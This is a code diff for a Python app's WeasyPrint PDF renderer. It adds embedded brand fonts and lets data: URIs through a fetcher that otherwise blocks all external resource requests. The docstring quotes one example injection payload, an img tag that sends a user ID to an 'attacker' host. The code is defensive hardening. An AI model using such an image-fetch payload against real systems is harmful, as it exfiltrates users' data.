@@ -14,6 +14,7 @@ from app.core.auth import (
     get_current_user_or_api_key_sse,
 )
 from app.core.config import settings
+from app.core.pdf_assets import FONT_FACE_CSS
 from app.models import User, Check, Claim, Evidence, RawEvidence, Subscription
 from datetime import datetime, timezone
 import uuid
@@ -79,7 +80,16 @@ jinja_env = Environment(
 def _block_pdf_network_fetch(url: str, timeout: int = 10, ssl_context=None):
     """F-SEC-05: block WeasyPrint from fetching external resources at PDF
     render time. Stops poisoned claim text with `<img src="http://attacker/?u={{user_id}}">`
-    from exfiltrating user data via image fetches."""
+    from exfiltrating user data via image fetches.
+
+    ``data:`` URIs are permitted: they are self-contained (no network request,
+    no filesystem access) and are how the brand fonts are embedded
+    (`app.core.pdf_assets`). Everything else is refused. Claim/evidence text is
+    Jinja-autoescaped, so an attacker cannot inject a `data:` URI of their own."""
+    if url.startswith("data:"):
+        from weasyprint import default_url_fetcher
+
+        return default_url_fetcher(url, timeout, ssl_context)
     raise ValueError(f"PDF rendering may not fetch external resources (blocked: {url})")
 
 
@@ -2246,6 +2256,7 @@ async def _build_check_pdf_bytes(check: Check, session: AsyncSession) -> bytes:
             total_elements=total_elements,
             tier_counts=tier_counts,
             type_counts=type_counts,
+            font_face_css=FONT_FACE_CSS,
             now=datetime.now(timezone.utc),
         )
     except Exception as e:
